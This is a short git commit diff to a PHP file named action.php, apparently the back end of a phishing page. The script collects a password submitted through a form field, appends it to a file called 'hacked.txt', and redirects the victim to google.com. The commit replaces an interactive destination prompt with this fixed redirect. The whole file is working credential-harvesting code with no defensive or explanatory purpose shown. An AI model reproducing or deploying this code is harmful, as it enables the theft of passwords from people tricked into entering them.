32bcd9f9daa9c16e7bb36bdd1ab0b6d2229843ec
khan saad <32749921+khansaad1275@users.noreply.github.com>
2020-10-28 14:24:35 +0530

    Update action.php

--- action.php
+++ action.php
@@ -1,5 +1,4 @@
 <?php
-$Location = readline('Enter the Destination URL: '); 
 file_put_contents("hacked.txt", " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
-header($Location);
+header('Location: https://www.google.com');
 ?>
